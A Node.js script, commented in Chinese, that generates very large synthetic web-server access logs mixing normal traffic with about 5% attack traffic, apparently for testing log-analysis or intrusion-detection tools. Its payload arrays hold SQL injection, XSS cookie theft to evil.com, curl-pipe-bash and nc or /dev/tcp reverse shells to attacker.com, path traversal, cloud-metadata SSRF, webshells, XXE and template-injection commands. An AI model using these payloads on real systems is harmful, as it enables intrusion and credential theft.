#!/usr/bin/env node
/**
 * 超大规模网站日志生成器
 * 生成 Apache/Nginx Combined Log Format 日志，包含正常流量和各类攻击
 *
 * 用法: node scripts/generate-mega-log.js [--lines 数量] [--output 文件路径]
 * 默认: 1亿行 (100,000,000)，输出到 samples/mega-access.log
 */

const fs = require('fs')
const path = require('path')

// ─── 配置 ───
const args = process.argv.slice(2)
const getArg = (name, def) => {
  const idx = args.indexOf(`--${name}`)
  return idx >= 0 && args[idx + 1] ? args[idx + 1] : def
}

const TOTAL_LINES = parseInt(getArg('lines', '100000000'), 10)
const OUTPUT_FILE = getArg('output', path.join(__dirname, '..', 'samples', 'mega-access.log'))
const ATTACK_RATIO = 0.05 // 5% 攻击流量

console.log(`日志生成器启动`)
console.log(`  目标行数: ${TOTAL_LINES.toLocaleString()}`)
console.log(`  输出文件: ${OUTPUT_FILE}`)
console.log(`  攻击比例: ${(ATTACK_RATIO * 100).toFixed(1)}%`)
console.log(`  预估大小: ~${(TOTAL_LINES * 0.0003).toFixed(0)} GB`)
console.log()

// ─── 随机工具 ───
const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min
const pick = (arr) => arr[rand(0, arr.length - 1)]
const weighted = (items, weights) => {
  const total = weights.reduce((a, b) => a + b, 0)
  let r = Math.random() * total
  for (let i = 0; i < items.length; i++) {
    r -= weights[i]
    if (r <= 0) return items[i]
  }
  return items[items.length - 1]
}

// ─── IP 池 ───
const IP_POOL_SIZE = 50000
const ipPool = []
for (let i = 0; i < IP_POOL_SIZE; i++) {
  const a = weighted([10, 172, 192, rand(1, 223)], [5, 3, 2, 90])
  if (a === 10) ipPool.push(`10.${rand(0, 255)}.${rand(0, 255)}.${rand(1, 254)}`)
  else if (a === 172) ipPool.push(`172.${rand(16, 31)}.${rand(0, 255)}.${rand(1, 254)}`)
  else if (a === 192) ipPool.push(`192.168.${rand(0, 255)}.${rand(1, 254)}`)
  else ipPool.push(`${a}.${rand(0, 255)}.${rand(0, 255)}.${rand(1, 254)}`)
}

// ─── 攻击者 IP 池（少量高频攻击者）───
const ATTACKER_IPS = []
for (let i = 0; i < 500; i++) {
  ATTACKER_IPS.push(`${rand(1, 223)}.${rand(0, 255)}.${rand(0, 255)}.${rand(1, 254)}`)
}

// ─── User-Agent 池 ───
const NORMAL_UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
]

const BOT_UAS = [
  'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
  'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
  'Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)',
  'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
  'DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)',
  'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
  'Twitterbot/1.0',
  'LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpAsyncClient/4.1.4)',
  'Applebot/0.1 (http://www.apple.com/go/applebot)',
  'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
  'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)',
  'Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot)',
]

const ATTACK_UAS = [
  'sqlmap/1.7.10#stable (http://sqlmap.org)',
  'nikto/2.5.0',
  'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)',
  'ZmEu',
  'w3af.org',
  'DirBuster-1.0-RC1',
  'Hydra',
  'WhatWeb/0.5.5',
  'Wget/1.21.3',
  'curl/8.4.0',
  'Python-urllib/3.11',
  'Go-http-client/1.1',
  'masscan/1.3.2',
  'Goby',
  'Xray',
  'Burp Suite Professional',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', // generic, suspicious
]

// ─── 正常路径池 ───
const NORMAL_PATHS = [
  '/', '/index.html', '/index.php', '/home', '/about', '/about-us', '/contact',
  '/products', '/products/list', '/products/detail', '/products/search',
  '/blog', '/blog/post', '/blog/category', '/blog/tag',
  '/login', '/register', '/logout', '/forgot-password', '/reset-password',
  '/dashboard', '/profile', '/settings', '/account',
  '/api/v1/users', '/api/v1/products', '/api/v1/orders', '/api/v1/search',
  '/api/v1/auth/login', '/api/v1/auth/register', '/api/v1/auth/refresh',
  '/api/v2/users', '/api/v2/products', '/api/v2/orders',
  '/api/health', '/api/status', '/api/version',
  '/static/css/main.css', '/static/js/app.js', '/static/js/vendor.js',
  '/static/images/logo.png', '/static/images/banner.jpg',
  '/static/fonts/roboto.woff2', '/static/media/video.mp4',
  '/favicon.ico', '/robots.txt', '/sitemap.xml', '/manifest.json',
  '/ws/chat', '/ws/notifications', '/ws/realtime',
  '/admin', '/admin/login', '/admin/dashboard', '/admin/users', '/admin/settings',
  '/docs', '/docs/api', '/docs/guide', '/docs/faq',
  '/help', '/support', '/faq', '/terms', '/privacy',
  '/download', '/download/app', '/download/mac', '/download/win', '/download/linux',
  '/checkout', '/cart', '/payment', '/order/confirm', '/order/status',
  '/search', '/search?q=test', '/search?q=hello', '/search?q=product',
  '/feed', '/rss', '/atom.xml',
  '/cdn-cgi/trace', '/.well-known/security.txt',
  '/wp-login.php', '/wp-admin', '/wp-includes',  // WordPress 探测（正常）
  '/phpmyadmin', '/phpinfo.php',  // 常见探测路径
  '/actuator/health', '/actuator/info', '/actuator/env',
  '/swagger-ui.html', '/api-docs', '/openapi.json',
]

const QUERY_PARAMS = [
  '', '', '', '', // 大概率无参数
  '?page=1', '?page=2', '?page=3', '?page=10', '?page=100',
  '?id=1', '?id=42', '?id=100', '?id=9999',
  '?lang=zh-CN', '?lang=en-US', '?lang=ja',
  '?sort=newest', '?sort=price', '?sort=popular',
  '?category=electronics', '?category=clothing', '?category=books',
  '?search=phone', '?search=laptop', '?search=headphones',
  '?limit=10', '?limit=20', '?limit=50',
  '?offset=0', '?offset=20', '?offset=100',
  '?format=json', '?format=xml', '?format=csv',
  '?callback=jQuery123', '?_=1703980800',
]

// ─── 攻击 Payload 库 ───
const SQL_INJECTION = [
  "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
  "' UNION SELECT NULL,NULL,NULL --", "' UNION SELECT username,password FROM users --",
  "' UNION ALL SELECT 1,2,3,4,5 --", "' UNION SELECT NULL,table_name FROM information_schema.tables --",
  "1; DROP TABLE users --", "1'; WAITFOR DELAY '0:0:5' --",
  "' AND 1=1 --", "' AND 1=2 --", "' OR 1=1 #",
  "admin'--", "admin' #", "admin'/*",
  "' OR 'x'='x", "' OR ''='",
  "1' ORDER BY 10 --", "1' ORDER BY 1 --",
  "' UNION SELECT @@version --", "' UNION SELECT LOAD_FILE('/etc/passwd') --",
  "1' AND SLEEP(5) --", "1' AND BENCHMARK(10000000,SHA1('test')) --",
  "1; EXEC xp_cmdshell('dir') --",
  "' OR 1=1 LIMIT 1 --", "' HAVING 1=1 --", "' GROUP BY 1 --",
  "0x27204f5220313d31", // hex encoded
  "1'%0aUNION%0aSELECT%0a1,2,3 --", // newline bypass
  "/**/UNION/**/SELECT/**/1,2,3 --", // comment bypass
  "' UNION SELECT NULL,concat(user,password),NULL FROM mysql.user --",
  "1' AND (SELECT COUNT(*) FROM users) > 0 --",
  "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
  "1'; INSERT INTO users VALUES('hacker','pass') --",
  "' UNION SELECT NULL,@@datadir,NULL --",
  "1' UNION SELECT NULL,version(),NULL --",
  "' AND 1=CONVERT(int,(SELECT @@version)) --",
  "1' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database() --",
  "1' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users' --",
]

const XSS_PAYLOADS = [
  "<script>alert(1)</script>",
  "<script>alert('XSS')</script>",
  "<script>alert(document.cookie)</script>",
  "<script>document.location='http://evil.com/?c='+document.cookie</script>",
  "<img src=x onerror=alert(1)>",
  "<img src=x onerror=alert('XSS')>",
  "<svg onload=alert(1)>",
  "<svg/onload=alert('XSS')>",
  "<body onload=alert(1)>",
  "<iframe src='javascript:alert(1)'></iframe>",
  "<input onfocus=alert(1) autofocus>",
  "<marquee onstart=alert(1)>",
  "<details open ontoggle=alert(1)>",
  "<video><source onerror=alert(1)>",
  "<math><mtext><table><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src=1>\">",
  "javascript:alert(1)",
  "javascript:alert(document.domain)",
  "jaVasCript:alert(1)",
  "data:text/html,<script>alert(1)</script>",
  "';alert(1)//",
  "\"><script>alert(1)</script>",
  "'-alert(1)-'",
  "\"><img src=x onerror=alert(1)>",
  "<img src=\"javascript:alert(1)\">",
  "<link rel=import href=\"data:text/html,<script>alert(1)</script>\">",
  "%3Cscript%3Ealert(1)%3C/script%3E",
  "&#60;script&#62;alert(1)&#60;/script&#62;",
  "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
  "<scr<script>ipt>alert(1)</scr</script>ipt>",
  "<ScRiPt>alert(1)</ScRiPt>",
  "'-alert(String.fromCharCode(88,83,83))-'",
  "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
  "<svg/onload=fetch('http://evil.com/?c='+document.cookie)>",
  "<script>fetch('http://evil.com',{method:'POST',body:document.cookie})</script>",
  "onmouseover=alert(1)",
]

const CMD_INJECTION = [
  "; cat /etc/passwd",
  "| cat /etc/passwd",
  "|| cat /etc/passwd",
  "& cat /etc/passwd",
  "&& cat /etc/passwd",
  "`cat /etc/passwd`",
  "$(cat /etc/passwd)",
  "; ls -la /",
  "| ls -la /",
  "; id",
  "| id",
  "; whoami",
  "| whoami",
  "; uname -a",
  "| uname -a",
  "; netstat -an",
  "| netstat -an",
  "; ps aux",
  "| ps aux",
  "; cat /etc/shadow",
  "| cat /etc/shadow",
  "; wget http://evil.com/shell.sh",
  "| wget http://evil.com/shell.sh",
  "; curl http://evil.com/shell.sh | bash",
  "| curl http://evil.com/shell.sh | bash",
  "; nc -e /bin/bash attacker.com 4444",
  "| nc -e /bin/bash attacker.com 4444",
  "; python -c 'import socket,subprocess'",
  "| python -c 'import os;os.system(\"id\")'",
  "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
  "; ping -c 10 attacker.com",
  "; /bin/sh -c 'id'",
  "; powershell -c 'Get-Process'",
  "| powershell -c 'Get-ChildItem C:\\'",
  "; dir C:\\",
  "| type C:\\windows\\system32\\drivers\\etc\\hosts",
  "() { :;}; /bin/bash -c 'cat /etc/passwd'", // Shellshock
  "() { :;}; echo; /bin/cat /etc/passwd",
  "%0a cat /etc/passwd",
  "%0d%0a cat /etc/passwd",
  "; sleep 5",
  "| sleep 5",
  "`sleep 5`",
  "$(sleep 5)",
  "; ping -c 5 127.0.0.1",
  "; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash", // base64 encoded
]

const DIRECTORY_TRAVERSAL = [
  "../../etc/passwd",
  "../../../etc/passwd",
  "../../../../etc/passwd",
  "../../../../../etc/passwd",
  "../../../../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\config\\sam",
  "..\\..\\..\\..\\windows\\system32\\config\\sam",
  "....//....//....//etc/passwd",
  "..%2F..%2F..%2Fetc%2Fpasswd",
  "..%252f..%252f..%252fetc%252fpasswd",
  "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "....\/....\/....\/etc\/passwd",
  "..;/..;/..;/etc/passwd",
  "..%00/..%00/..%00/etc/passwd",
  "/etc/passwd%00",
  "/etc/passwd%00.jpg",
  "/var/log/apache2/access.log",
  "/var/log/nginx/access.log",
  "/proc/self/environ",
  "/proc/version",
  "/etc/hosts",
  "/etc/hostname",
  "C:\\boot.ini",
  "C:\\windows\\win.ini",
  "C:\\windows\\system32\\config\\system",
  "/WEB-INF/web.xml",
  "/META-INF/MANIFEST.MF",
  "....\\....\\....\\etc\\passwd",
  "file:///etc/passwd",
  "file:///c:/windows/win.ini",
]

const SSRF_PAYLOADS = [
  "http://169.254.169.254/latest/meta-data/",
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "http://169.254.169.254/latest/user-data/",
  "http://metadata.google.internal/computeMetadata/v1/",
  "http://169.254.169.254/metadata/v1/",
  "http://localhost",
  "http://localhost:80",
  "http://localhost:8080",
  "http://localhost:3306",
  "http://localhost:6379",
  "http://127.0.0.1",
  "http://127.0.0.1:8080",
  "http://127.0.0.1:9200",
  "http://0.0.0.0",
  "http://[::1]",
  "http://0177.0.0.1", // octal
  "http://2130706433", // decimal
  "http://0x7f000001", // hex
  "file:///etc/passwd",
  "file:///c:/windows/win.ini",
  "dict://localhost:6379/info",
  "gopher://localhost:6379/_INFO%0d%0a",
  "http://169.254.169.254/latest/meta-data/hostname",
  "http://100.100.100.200/latest/meta-data/", // Alibaba Cloud
  "http://metadata.tencentyun.com/latest/meta-data/", // Tencent Cloud
  "http://169.254.169.254/openstack/latest/", // OpenStack
]

const WEBSHELL_PAYLOADS = [
  "<?php eval($_POST['cmd']); ?>",
  "<?php system($_GET['cmd']); ?>",
  "<?php passthru($_REQUEST['cmd']); ?>",
  "<?php echo shell_exec($_GET['cmd']); ?>",
  "<?php assert($_POST['code']); ?>",
  "<?php eval(base64_decode($_POST['data'])); ?>",
  "<%eval request(\"cmd\")%>",
  "<%execute(request(\"cmd\"))%>",
  "${Runtime.getRuntime().exec('id')}",
  "<%=Runtime.getRuntime().exec(request.getParameter(\"cmd\"))%>",
  "<?= `$_GET[cmd]` ?>",
  "<?php preg_replace('/test/e',$_POST['cmd'],'test'); ?>",
  "<?php array_map('assert',array($_POST['cmd'])); ?>",
  "<?php call_user_func('assert',$_POST['cmd']); ?>",
  "<?php $func=create_function('',$_POST['cmd']);$func(); ?>",
  "POST /shell.php HTTP/1.1",
  "POST /cmd.jsp HTTP/1.1",
  "POST /console.jsp HTTP/1.1",
  "GET /c99.php HTTP/1.1",
  "GET /r57.php HTTP/1.1",
  "GET /b374k.php HTTP/1.1",
  "POST /antsword.php HTTP/1.1", // 蚁剑
  "POST /behinder.php HTTP/1.1", // 冰蝎
  "POST /godzilla.php HTTP/1.1", // 哥斯拉
]

const NOSQL_INJECTION = [
  '{"$gt":""}',
  '{"$ne":""}',
  '{"$gt":null}',
  '{"$regex":".*"}',
  '{"$where":"this.password==this.username"}',
  '{"$where":"sleep(5000)"}',
  '{"username":{"$ne":""},"password":{"$ne":""}}',
  '{"username":{"$regex":"admin.*"}}',
  '{"$or":[{"username":"admin"},{"username":"root"}]}',
  '{"username":{"$in":["admin","root","test"]}}',
  '{"$where":"function(){return this.username==\'admin\'}"}',
  '{"username":{"$exists":true}}',
  '{"password":{"$regex":"^a"}}',
]

const LDAP_INJECTION = [
  "*()|&'",
  "*)(&",
  "*)(objectClass=*",
  "admin)(&)",
  "admin*)(|(password=*))",
  "*()|%00",
  ")(cn=*))(|(cn=*",
  "*)(uid=*))(|(uid=*",
  "admin)(!(&(objectClass=*)(uid=admin)))",
]

const XXE_PAYLOADS = [
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]>',
  '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>',
]

const TEMPLATE_INJECTION = [
  "{{7*7}}", "{{config}}", "{{self.__class__.__mro__}}",
  "${7*7}", "#{7*7}", "<%= 7*7 %>",
  "{{''.__class__.__mro__[2].__subclasses__()}}",
  "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
  "{{config.items()}}", "{{lipsum.__globals__['os'].popen('id').read()}}",
  "*{7*7}", "]=] {{7*7}}",
  "<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('id')}",
  "<#assign classloader=article.class.protectionDomain.classLoader>",
  "{{T(java.lang.Runtime).getRuntime().exec('id')}}",
  "#{T(java.lang.Runtime).getRuntime().exec('id')}",
]

const CRLF_PAYLOADS = [
  "%0d%0aSet-Cookie:sessionid=evil",
  "%0d%0aX-Injected:true",
  "%0d%0aLocation:http://evil.com",
  "\r\nSet-Cookie:injected=true",
  "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a",
]

// ─── 攻击类型定义 ───
const ATTACK_TYPES = [
  { name: 'SQL注入', payloads: SQL_INJECTION, paths: ['/login', '/api/users', '/api/products', '/search', '/admin/login', '/api/orders', '/api/auth/login', '/products/detail', '/blog/post', '/user/profile'], weight: 25 },
  { name: 'XSS攻击', payloads: XSS_PAYLOADS, paths: ['/search', '/comment', '/profile', '/blog/post', '/products', '/api/feedback', '/guestbook', '/forum/post', '/api/comments'], weight: 20 },
  { name: '命令注入', payloads: CMD_INJECTION, paths: ['/api/ping', '/api/diag', '/admin/tools', '/api/exec', '/api/system', '/tools/traceroute', '/api/upload', '/api/convert'], weight: 15 },
  { name: '目录遍历', payloads: DIRECTORY_TRAVERSAL, paths: ['/static/', '/uploads/', '/files/', '/download/', '/images/', '/backup/', '/api/files/', '/docs/'], weight: 10 },
  { name: 'SSRF攻击', payloads: SSRF_PAYLOADS, paths: ['/api/fetch', '/api/proxy', '/api/webhook', '/api/url-preview', '/api/import', '/api/rss', '/admin/fetch'], weight: 8 },
  { name: 'WebShell', payloads: WEBSHELL_PAYLOADS, paths: ['/uploads/shell.php', '/uploads/cmd.jsp', '/images/backdoor.php', '/tmp/shell.php', '/public/shell.php', '/admin/shell.php'], weight: 5 },
  { name: 'NoSQL注入', payloads: NOSQL_INJECTION, paths: ['/api/login', '/api/users', '/api/search', '/api/query'], weight: 5 },
  { name: 'LDAP注入', payloads: LDAP_INJECTION, paths: ['/api/auth', '/api/users/search', '/login', '/api/ldap'], weight: 3 },
  { name: 'XXE注入', payloads: XXE_PAYLOADS, paths: ['/api/xml', '/api/import', '/api/parse', '/api/upload', '/soap'], weight: 3 },
  { name: '模板注入', payloads: TEMPLATE_INJECTION, paths: ['/api/render', '/api/template', '/api/preview', '/admin/template'], weight: 3 },
  { name: 'CRLF注入', payloads: CRLF_PAYLOADS, paths: ['/redirect', '/api/callback', '/login', '/api/oauth'], weight: 3 },
]

// ─── HTTP 方法 ───
const METHODS = ['GET', 'GET', 'GET', 'GET', 'GET', 'POST', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH']
const ATTACK_METHODS = ['GET', 'GET', 'POST', 'POST', 'POST', 'PUT']

// ─── 状态码分布 ───
const STATUS_WEIGHTED = [
  [200, 60], [301, 5], [302, 5], [304, 10], [400, 3], [401, 2],
  [403, 3], [404, 7], [500, 2], [502, 1], [503, 1], [504, 1],
]
const STATUSES = []
STATUS_WEIGHTED.forEach(([code, weight]) => {
  for (let i = 0; i < weight; i++) STATUSES.push(code)
})

const ATTACK_STATUSES = [200, 200, 400, 403, 403, 404, 404, 500, 500, 500, 401, 401]

// ─── Referer 池 ───
const REFERERS = [
  '-',
  '-',
  '-',
  'https://www.google.com/',
  'https://www.baidu.com/',
  'https://www.bing.com/',
  'https://search.yahoo.com/',
  'https://www.sogou.com/',
  'https://cn.bing.com/',
  'https://github.com/',
  'https://stackoverflow.com/',
  'https://www.zhihu.com/',
  'https://weibo.com/',
  'https://www.douyin.com/',
  'https://www.bilibili.com/',
]

// ─── 时间生成 ───
const MONTHS = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
const DAYS = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat']

function formatDate(timestamp) {
  const d = new Date(timestamp)
  const day = DAYS[d.getUTCDay()]
  const date = d.getUTCDate()
  const month = MONTHS[d.getUTCMonth()]
  const year = d.getUTCFullYear()
  const hours = String(d.getUTCHours()).padStart(2, '0')
  const mins = String(d.getUTCMinutes()).padStart(2, '0')
  const secs = String(d.getUTCSeconds()).padStart(2, '0')
  return `${day}/${date}/${month}/${year}:${hours}:${mins}:${secs} +0000`
}

// ─── 单行生成 ───
function generateNormalLine(timestamp) {
  const ip = pick(ipPool)
  const method = pick(METHODS)
  const path = pick(NORMAL_PATHS)
  const query = pick(QUERY_PARAMS)
  const status = pick(STATUSES)
  const size = rand(200, 500000)
  const ua = weighted([...NORMAL_UAS, ...BOT_UAS], [80, 80, 80, 80, 80, 80, 80, 80, 80, 80, 80, 80, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5])
  const referer = pick(REFERERS)
  const url = path + query

  return `${ip} - - [${formatDate(timestamp)}] "${method} ${url} HTTP/1.1" ${status} ${size} "${referer}" "${ua}"`
}

function generateAttackLine(timestamp) {
  const attack = weighted(ATTACK_TYPES.map(a => a.name), ATTACK_TYPES.map(a => a.weight))
  const attackDef = ATTACK_TYPES.find(a => a.name === attack)

  const ip = pick(ATTACKER_IPS)
  const method = pick(ATTACK_METHODS)
  const basePath = pick(attackDef.paths)
  const payload = pick(attackDef.payloads)

  // 根据攻击类型组合 URL
  let url
  if (['SQL注入', 'XSS攻击', 'NoSQL注入', 'LDAP注入', '命令注入', '模板注入', 'CRLF注入'].includes(attack)) {
    const sep = method === 'GET' ? '?' : ' '
    if (method === 'GET') {
      url = `${basePath}?q=${encodeURIComponent(payload)}&page=1`
    } else {
      url = basePath
    }
  } else if (attack === '目录遍历') {
    url = `${basePath}${payload}`
  } else if (attack === 'SSRF攻击') {
    url = `${basePath}?url=${encodeURIComponent(payload)}`
  } else if (attack === 'WebShell') {
    url = basePath
  } else if (attack === 'XXE注入') {
    url = basePath
  } else {
    url = basePath
  }

  const status = pick(ATTACK_STATUSES)
  const size = rand(0, 5000)
  const ua = pick(ATTACK_UAS)
  const referer = '-'

  let line = `${ip} - - [${formatDate(timestamp)}] "${method} ${url} HTTP/1.1" ${status} ${size} "${referer}" "${ua}"`

  // 对于 POST 类攻击，附加 body 日志（部分场景）
  if (method === 'POST' && ['SQL注入', 'XSS攻击', 'NoSQL注入', 'XXE注入', '模板注入', '命令注入'].includes(attack)) {
    // 在某些 Web 服务器日志中，POST body 会记录在额外字段
    // 这里不额外添加，保持标准 Combined Log Format
  }

  return line
}

// ─── 主生成逻辑 ───
async function generate() {
  const startTime = Date.now()
  const stream = fs.createWriteStream(OUTPUT_FILE, { encoding: 'utf8' })

  const CHUNK_SIZE = 100000 // 每次写入 10 万行
  let buffer = []
  let linesWritten = 0
  let attackCount = 0
  let lastPercent = -1

  // 时间范围：过去 30 天
  const now = Date.now()
  const thirtyDaysAgo = now - 30 * 24 * 60 * 60 * 1000

  for (let i = 0; i < TOTAL_LINES; i++) {
    // 随机时间戳（30天内，有时间分布偏好：白天多晚上少）
    let timestamp = thirtyDaysAgo + Math.random() * (now - thirtyDaysAgo)
    const hour = new Date(timestamp).getUTCHours()
    // 调整权重：白天 (8-22) 流量更大
    if (hour >= 2 && hour < 8 && Math.random() < 0.7) {
      timestamp = thirtyDaysAgo + Math.random() * (now - thirtyDaysAgo) // 重新随机
    }

    const isAttack = Math.random() < ATTACK_RATIO
    const line = isAttack ? generateAttackLine(timestamp) : generateNormalLine(timestamp)

    if (isAttack) attackCount++
    buffer.push(line)

    if (buffer.length >= CHUNK_SIZE) {
      const ok = stream.write(buffer.join('\n') + '\n')
      linesWritten += buffer.length
      buffer = []

      if (!ok) {
        await new Promise(resolve => stream.once('drain', resolve))
      }

      // 进度显示
      const percent = Math.floor(linesWritten / TOTAL_LINES * 100)
      if (percent !== lastPercent && percent % 5 === 0) {
        lastPercent = percent
        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1)
        const rate = (linesWritten / (Date.now() - startTime) * 1000).toFixed(0)
        const memMB = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(0)
        console.log(`  [${percent}%] ${linesWritten.toLocaleString()} 行 | ${elapsed}s | ${rate} 行/秒 | 内存: ${memMB}MB | 攻击: ${attackCount.toLocaleString()}`)
      }
    }
  }

  // 写入剩余
  if (buffer.length > 0) {
    stream.write(buffer.join('\n') + '\n')
    linesWritten += buffer.length
  }

  stream.end()

  await new Promise(resolve => stream.on('finish', resolve))

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(1)
  const fileSize = fs.statSync(OUTPUT_FILE).size
  const fileSizeGB = (fileSize / 1024 / 1024 / 1024).toFixed(2)

  console.log()
  console.log(`═══════════════════════════════════════`)
  console.log(`  生成完成！`)
  console.log(`  总行数:   ${linesWritten.toLocaleString()}`)
  console.log(`  攻击行数: ${attackCount.toLocaleString()} (${(attackCount/linesWritten*100).toFixed(1)}%)`)
  console.log(`  文件大小: ${fileSizeGB} GB`)
  console.log(`  耗时:     ${totalTime} 秒`)
  console.log(`  速度:     ${(linesWritten / (Date.now() - startTime) * 1000).toFixed(0)} 行/秒`)
  console.log(`  输出文件: ${OUTPUT_FILE}`)
  console.log(`═══════════════════════════════════════`)
}

generate().catch(err => {
  console.error('生成失败:', err)
  process.exit(1)
})
